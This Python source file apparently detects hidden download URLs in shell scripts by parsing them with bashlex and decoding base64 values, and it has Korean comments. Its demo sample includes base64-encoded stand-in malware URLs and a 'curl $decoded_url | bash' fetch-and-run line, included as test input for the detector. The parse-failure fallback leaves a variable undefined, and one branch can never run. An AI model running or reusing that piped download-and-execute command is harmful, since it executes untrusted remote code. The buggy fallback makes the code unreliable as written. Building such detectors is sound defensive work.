import bashlex
import re
import base64
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, unquote
from decoder.base64_decoder import find_base64_block, decode_base64_string

# Base64 관련 함수들을 여기에 직접 포함
# find_base64_block 정규식 강화

# === shell.py 의 기존 코드 ===
URL_PATTERN = re.compile(r'https?://[^\s\'\"\\|]+')

def extract_urls(text):
    return URL_PATTERN.findall(text)

def decode_command_substitution(val, variables):
    inner = val.strip()
    if inner.startswith('$(') and inner.endswith(')'):
        inner_cmd = inner[2:-1].strip()
        parts = inner_cmd.split('|')
        if len(parts) >= 2: # >= 2로 변경하여 유연성 증가
            left = parts[0].strip()
            right = parts[1].strip() # 첫 번째 파이프 이후만 고려

            if left.startswith('echo '):
                echo_content = left[5:].strip().strip('"').strip("'")
                for var, valv in variables.items():
                    echo_content = echo_content.replace(f"${{{var}}}", valv).replace(f"${var}", valv) # ${VAR} 형태 먼저 치환
                
                # 'base64' 명령어가 있는지 확인
                if 'base64' in right: # 'base64 -d' 뿐만 아니라 'base64'만 있어도 시도
                    
                    decoded_val = decode_base64_string(echo_content)
              
                    return decoded_val
    return None

def analyze_script(script):
    variables = {}
    urls_found = set()

    # bashlex 파싱 시도. 파싱 오류 발생 가능성 고려
    try:
        parts = bashlex.parse(script)
    except Exception as e:

        # 임시 방편으로, 직접 라인별로 처리하거나 다른 파서 사용 고려
       
        for line in script.split('\n'):
            line = line.strip()
            if re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*=".*"$', line) or re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*=\$\(.+\)$', line):
                try:
                    key, val_part = line.split('=', 1)
                    key = key.strip()
                    val = val_part.strip().strip('"').strip("'")
                    variables[key] = val
                  

                    # 할당된 값에서 Base64 디코딩 시도
                    b64_block = find_base64_block(val)
                    if b64_block:
                        decoded = decode_base64_string(b64_block)
                        if decoded:
                     
                            for url in extract_urls(decoded):
                                
                                urls_found.add(url)
                    # 명령 치환 부분도 폴백 처리 (간단하게)
                    if val.startswith('$(') and val.endswith(')'):
                        decoded_cmd_sub = decode_command_substitution(val, variables)
                        if decoded_cmd_sub:
                           
                            variables[key] = decoded_cmd_sub # 변수에 디코딩된 값 저장
                            for url in extract_urls(decoded_cmd_sub):
                              
                                urls_found.add(url)
                except ValueError:
                    pass # '=' 이 없는 라인 등

        # bashlex가 제대로 파싱되지 않았다면 여기서 종료
        # 직접적인 URL 추출은 아래 recursive_walk 바깥에서 다시 할 수 있음.
        # 이 시점에는 이미 직접적인 URL은 catch 되었을 것
        # return urls_found # 임시 종료 (아래 recursive_walk를 건너뜀)


    def recursive_walk(node):
        nonlocal variables, urls_found

        if node.kind == 'assignment' and len(node.parts) >= 2:
            key = node.parts[0].word
            val_node = node.parts[1]
            val = ''
            if val_node.kind == 'word':
                val = val_node.word.strip('"').strip("'")
                variables[key] = val
   

                decoded = None
          
                b64_block = find_base64_block(val)
   

                if b64_block and ('$' not in val) and ('${' not in val):

                    decoded = decode_base64_string(b64_block)


                if decoded:
                    variables[key] = decoded
             
                    for url in extract_urls(decoded):
                   
                        urls_found.add(url)

            elif val_node.kind == 'word' or val_node.kind == 'command_substitution':
                if val_node.kind == 'word':
                    val = val_node.word.strip()
                else:
                    val = val_node.word if hasattr(val_node, 'word') else ''


                decoded = decode_command_substitution(val, variables)
           

                if decoded:
                    variables[key] = decoded
            
                    for url in extract_urls(decoded):

                        urls_found.add(url)

        elif node.kind == 'command' and node.parts:
            # bashlex가 'url="abc"' 형태를 command로 잘못 파싱하는 경우를 대비
            # 첫 번째 파트가 'key=value' 형태인지 확인
            first_part_word = node.parts[0].word if hasattr(node.parts[0], 'word') else ''
            if '=' in first_part_word and not first_part_word.startswith('$'): # $로 시작하면 변수 자체일 수 있음
                try:
                    key, val_part = first_part_word.split('=', 1)
                    # 이 부분이 실제 변수 할당이라면 처리
                    val = val_part.strip('"').strip("'")
                    variables[key] = val
              
                    # 이어서 Base64 및 URL 추출 로직 수행 (assignment와 동일)
                    b64_block = find_base64_block(val)
                    if b64_block and ('$' not in val) and ('${' not in val):
                        decoded = decode_base64_string(b64_block)
                        if decoded:
                            variables[key] = decoded
                 
                            for url in extract_urls(decoded):
                                urls_found.add(url)
                    # 이 노드는 이미 처리했으므로 더 이상 args로 처리하지 않음
                    return # 재귀 종료 (이 노드에 대한 처리 완료)
                except ValueError:
                    pass # '='은 있지만 할당 형식이 아닌 경우 (예: echo "a=b")


            cmd_name = node.parts[0].word
            args = []
            for p in node.parts[1:]:
                if hasattr(p, 'word'):
                    args.append(p.word)

            resolved_args = []
            for arg in args:
                for var, val in variables.items():
                    arg = arg.replace(f"${{{var}}}", val).replace(f"${var}", val)
                resolved_args.append(arg)
            
  

            for arg in resolved_args:
                if ('$' not in arg) and ('${' not in arg):
    
                    b64_block = find_base64_block(arg)


                    if b64_block:
                     
                        decoded = decode_base64_string(b64_block)
             

                        if decoded:
                     
                            for url in extract_urls(decoded):
                             
                                urls_found.add(url)

                for url in extract_urls(arg):
            
                    urls_found.add(url)

        if hasattr(node, 'parts'):
            for part in node.parts:
                recursive_walk(part)
        # bashlex가 파이프라인이나 블록을 처리하는 방식에 따라 추가
        if hasattr(node, 'commands'):
            for command in node.commands:
                recursive_walk(command)
        if hasattr(node, 'body'):
            for part in node.body:
                recursive_walk(part)


    for part in parts:
        recursive_walk(part)

    return urls_found

if __name__ == "__main__":
    sample_script = '''
    url="aHR0cDovL21hbGljaW91cy5zaXRlL2JhY2tkb29yLnNo"
     url="aHR0cDovL3d3dy5leGFtcGxlLmNvbS9tYWxpY2lvdXMuZXhl"
      url="https://badsite.com/?url=aHR0cHM6Ly9iYWRzaXRlLmNvbS9wdGF0aC5leGU="
    decoded_url=$(echo $url | base64 -d)
    curl $decoded_url | bash
    wget http://safe-site.com/script.sh
    '''

  
    found_urls = analyze_script(sample_script)

    print("\n탐지된 최종 URL 목록:")
    for url in found_urls:
        print(url) 